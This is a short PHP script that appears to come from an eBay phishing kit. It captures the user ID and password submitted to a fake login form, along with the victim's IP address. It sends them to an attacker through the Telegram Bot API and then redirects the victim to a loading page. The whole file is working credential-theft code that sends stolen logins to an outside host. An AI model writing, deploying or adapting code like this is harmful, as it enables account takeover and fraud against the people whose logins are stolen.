<?php
include 'telegram.php';
$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");
	$message .= '
------log-Ebay-------
| usr= '.$_POST['userid'].'
| pas= '.$_POST['pwd'].'
------------ '.$ip.' ------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
header("location: loading.html");
    exit();
?>